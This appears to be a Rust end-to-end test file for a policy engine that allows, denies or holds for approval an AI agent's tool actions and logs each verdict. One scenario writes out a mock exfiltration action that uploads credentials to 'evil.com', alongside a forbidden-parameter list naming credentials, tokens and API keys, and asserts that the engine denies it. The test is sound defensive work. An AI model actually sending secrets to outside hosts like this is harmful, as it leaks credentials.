//! End-to-end scenario tests simulating real-world security workflows.
//! Each test exercises: policy definition → engine evaluation → audit logging → report verification.

use vellaveto_audit::AuditLogger;
use vellaveto_engine::PolicyEngine;
use vellaveto_types::{Action, Policy, PolicyType, Verdict};
use serde_json::json;
use tempfile::TempDir;

fn runtime() -> tokio::runtime::Runtime {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .expect("failed to create tokio runtime")
}

fn make_action(tool: &str, function: &str, params: serde_json::Value) -> Action {
    Action::new(tool.to_string(), function.to_string(), params)
}

// ════════════════════════════════════════════════
// SCENARIO 1: Developer sandbox with mixed permissions
// ═════════════════════════════════════════════════

#[test]
fn scenario_developer_sandbox() {
    let rt = runtime();
    rt.block_on(async {
        let engine = PolicyEngine::new(false);
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        let policies = vec![
            // Allow file reads
            Policy {
                id: "file:read".to_string(),
                name: "Allow file reads".to_string(),
                policy_type: PolicyType::Allow,
                priority: 10,
                path_rules: None,
                network_rules: None,
            },
            // Deny file deletes
            Policy {
                id: "file:delete".to_string(),
                name: "Block file deletes".to_string(),
                policy_type: PolicyType::Deny,
                priority: 100,
                path_rules: None,
                network_rules: None,
            },
            // Require approval for bash
            Policy {
                id: "bash:*".to_string(),
                name: "Bash requires approval".to_string(),
                policy_type: PolicyType::Conditional {
                    conditions: json!({"require_approval": true}),
                },
                priority: 50,
                path_rules: None,
                network_rules: None,
            },
        ];

        // Simulate a developer session
        let actions = [
            make_action("file", "read", json!({"path": "/src/main.rs"})),
            make_action("file", "delete", json!({"path": "/src/main.rs"})),
            make_action("bash", "execute", json!({"cmd": "cargo build"})),
            make_action("file", "read", json!({"path": "/Cargo.toml"})),
            make_action("unknown", "operation", json!({})),
        ];

        let expected_verdicts = [
            "Allow",
            "Deny",
            "RequireApproval",
            "Allow",
            "Deny", // no matching policy → default deny
        ];

        for (i, action) in actions.iter().enumerate() {
            let verdict = engine.evaluate_action(action, &policies).unwrap();
            logger
                .log_entry(action, &verdict, json!({"step": i}))
                .await
                .unwrap();

            let verdict_type = match &verdict {
                Verdict::Allow => "Allow",
                Verdict::Deny { .. } => "Deny",
                Verdict::RequireApproval { .. } => "RequireApproval",
                // Handle future variants
                _ => "Unknown",
            };
            assert_eq!(
                verdict_type, expected_verdicts[i],
                "Step {}: action {}:{} expected {} got {}",
                i, action.tool, action.function, expected_verdicts[i], verdict_type
            );
        }

        let report = logger.generate_report().await.unwrap();
        assert_eq!(report.total_entries, 5);
        assert_eq!(report.allow_count, 2);
        assert_eq!(report.deny_count, 2);
        assert_eq!(report.require_approval_count, 1);

        // Verify audit entries match the actions in order
        assert_eq!(report.entries[0].action.function, "read");
        assert_eq!(report.entries[1].action.function, "delete");
        assert_eq!(report.entries[2].action.tool, "bash");
        assert_eq!(report.entries[3].action.function, "read");
        assert_eq!(report.entries[4].action.tool, "unknown");
    });
}

// ═════════════════════════════════════════════════
// SCENARIO 2: Deny-all lockdown with a single exception
// ════════════════════════════════════════════════

#[test]
fn scenario_lockdown_with_exception() {
    let rt = runtime();
    rt.block_on(async {
        let engine = PolicyEngine::new(false);
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        let policies = vec![
            // Deny everything at low priority
            Policy {
                id: "*".to_string(),
                name: "Deny All".to_string(),
                policy_type: PolicyType::Deny,
                priority: 1,
                path_rules: None,
                network_rules: None,
            },
            // Allow only git operations at higher priority
            Policy {
                id: "git:*".to_string(),
                name: "Allow git".to_string(),
                policy_type: PolicyType::Allow,
                priority: 100,
                path_rules: None,
                network_rules: None,
            },
        ];

        let test_cases = vec![
            (make_action("git", "status", json!({})), true), // allowed
            (make_action("git", "commit", json!({})), true), // allowed
            (make_action("bash", "execute", json!({})), false), // denied
            (make_action("file", "delete", json!({})), false), // denied
            (make_action("git", "push", json!({})), true),   // allowed
        ];

        for (action, should_allow) in &test_cases {
            let verdict = engine.evaluate_action(action, &policies).unwrap();
            logger.log_entry(action, &verdict, json!({})).await.unwrap();

            if *should_allow {
                assert_eq!(
                    verdict,
                    Verdict::Allow,
                    "{}:{} should be allowed",
                    action.tool,
                    action.function
                );
            } else {
                match &verdict {
                    Verdict::Deny { .. } => {}
                    other => panic!(
                        "{}:{} should be denied, got {:?}",
                        action.tool, action.function, other
                    ),
                }
            }
        }

        let report = logger.generate_report().await.unwrap();
        assert_eq!(report.allow_count, 3);
        assert_eq!(report.deny_count, 2);
    });
}

// ═════════════════════════════════════════════════
// SCENARIO 3: Forbidden parameter blocks data exfiltration
// ═════════════════════════════════════════════════

#[test]
fn scenario_data_exfiltration_prevention() {
    let rt = runtime();
    rt.block_on(async {
        let engine = PolicyEngine::new(false);
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        let policies = vec![
            // Block any action with "credentials" or "tokens" parameters
            Policy {
                id: "*".to_string(),
                name: "Block credential access".to_string(),
                policy_type: PolicyType::Conditional {
                    conditions: json!({
                        "forbidden_parameters": ["credentials", "tokens", "api_key"]
                    }),
                },
                priority: 500,
                path_rules: None,
                network_rules: None,
            },
        ];

        // Safe action (no forbidden params)
        let safe = make_action(
            "network",
            "fetch",
            json!({"url": "https://api.example.com"}),
        );
        let v1 = engine.evaluate_action(&safe, &policies).unwrap();
        assert_eq!(
            v1,
            Verdict::Allow,
            "Action without forbidden params should be allowed"
        );
        logger.log_entry(&safe, &v1, json!({})).await.unwrap();

        // Dangerous action with credentials
        let dangerous = make_action(
            "network",
            "upload",
            json!({
                "url": "https://evil.com",
                "credentials": {"username": "admin", "password": "secret"}
            }),
        );
        let v2 = engine.evaluate_action(&dangerous, &policies).unwrap();
        match &v2 {
            Verdict::Deny { reason } => {
                assert!(
                    reason.contains("credentials"),
                    "Should mention 'credentials': {}",
                    reason
                );
            }
            other => panic!("Should deny action with credentials param, got {:?}", other),
        }
        logger.log_entry(&dangerous, &v2, json!({})).await.unwrap();

        // Dangerous action with api_key
        let api_leak = make_action(
            "network",
            "post",
            json!({
                "api_key": "sk-12345",
                "data": "normal"
            }),
        );
        let v3 = engine.evaluate_action(&api_leak, &policies).unwrap();
        match &v3 {
            Verdict::Deny { reason } => {
                assert!(
                    reason.contains("api_key"),
                    "Should mention 'api_key': {}",
                    reason
                );
            }
            other => panic!("Should deny action with api_key param, got {:?}", other),
        }
        logger.log_entry(&api_leak, &v3, json!({})).await.unwrap();

        let report = logger.generate_report().await.unwrap();
        assert_eq!(report.total_entries, 3);
        assert_eq!(report.allow_count, 1);
        assert_eq!(report.deny_count, 2);
    });
}

// ════════════════════════════════════════════════
// SCENARIO 4: Policy ordering matters—verify first match wins
// ═════════════════════════════════════════════════

#[test]
fn scenario_first_matching_policy_wins() {
    let rt = runtime();
    rt.block_on(async {
        let engine = PolicyEngine::new(false);
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Two policies match the same action at different priorities
        let policies = vec![
            Policy {
                id: "file:*".to_string(),
                name: "Approve file ops".to_string(),
                policy_type: PolicyType::Conditional {
                    conditions: json!({"require_approval": true}),
                },
                priority: 200,
                path_rules: None,
                network_rules: None,
            },
            Policy {
                id: "file:read".to_string(),
                name: "Allow file reads".to_string(),
                policy_type: PolicyType::Allow,
                priority: 100,
                path_rules: None,
                network_rules: None,
            },
        ];

        // file:read matches BOTH policies. The priority-200 one wins.
        let action = make_action("file", "read", json!({}));
        let verdict = engine.evaluate_action(&action, &policies).unwrap();
        match &verdict {
            Verdict::RequireApproval { .. } => {} // Higher priority conditional wins
            other => panic!("Higher priority conditional should win, got {:?}", other),
        }
        logger
            .log_entry(&action, &verdict, json!({}))
            .await
            .unwrap();

        // file:write only matches the first policy (file:*)
        let action2 = make_action("file", "write", json!({}));
        let verdict2 = engine.evaluate_action(&action2, &policies).unwrap();
        match &verdict2 {
            Verdict::RequireApproval { .. } => {}
            other => panic!(
                "file:write should match file:* conditional, got {:?}",
                other
            ),
        }
        logger
            .log_entry(&action2, &verdict2, json!({}))
            .await
            .unwrap();

        let report = logger.generate_report().await.unwrap();
        assert_eq!(report.require_approval_count, 2);
    });
}

// ═════════════════════════════════════════════════
// SCENARIO 5: Empty policy set is fail-closed
// ═════════════════════════════════════════════════

#[test]
fn scenario_no_policies_denies_everything() {
    let rt = runtime();
    rt.block_on(async {
        let engine = PolicyEngine::new(false);
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        let no_policies: Vec<Policy> = vec![];

        let actions = vec![
            make_action("file", "read", json!({})),
            make_action("bash", "execute", json!({})),
            make_action("network", "fetch", json!({})),
        ];

        for action in &actions {
            let verdict = engine.evaluate_action(action, &no_policies).unwrap();
            match &verdict {
                Verdict::Deny { reason } => {
                    assert!(reason.contains("No policies"), "Reason: {}", reason);
                }
                other => panic!("Empty policy set should deny, got {:?}", other),
            }
            logger.log_entry(action, &verdict, json!({})).await.unwrap();
        }

        let report = logger.generate_report().await.unwrap();
        assert_eq!(report.total_entries, 3);
        assert_eq!(report.deny_count, 3);
        assert_eq!(report.allow_count, 0);
    });
}

// ═════════════════════════════════════════════════
// SCENARIO 6: Audit entry IDs are unique
// ════════════════════════════════════════════════

#[test]
fn scenario_audit_entry_ids_are_unique() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));
        let action = make_action("tool", "func", json!({}));

        for _ in 0..50 {
            logger
                .log_entry(&action, &Verdict::Allow, json!({}))
                .await
                .unwrap();
        }

        let entries = logger.load_entries().await.unwrap();
        assert_eq!(entries.len(), 50);

        let mut ids: Vec<&str> = entries.iter().map(|e| e.id.as_str()).collect();
        let original_len = ids.len();
        ids.sort();
        ids.dedup();
        assert_eq!(
            ids.len(),
            original_len,
            "All 50 audit entry IDs should be unique, but found duplicates"
        );
    });
}
